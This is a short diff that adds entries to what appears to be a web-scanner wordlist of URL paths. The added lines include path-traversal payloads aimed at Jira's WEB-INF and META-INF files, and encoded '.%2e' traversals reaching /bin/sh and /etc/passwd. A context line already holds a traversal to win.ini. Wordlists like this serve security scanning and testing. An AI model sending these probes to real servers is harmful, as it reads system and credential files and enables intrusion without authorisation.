@@ -8,6 +8,10 @@
 /xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\win.ini
 /workspace/index.jsp
 /vision/mobileportal.jsp
+/s/cfx/_/;/WEB-INF/web.xml
+/s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
+/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
+/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
 /vision/mobileX/login
 /vision/index.jsp
 /atlantis/login.php
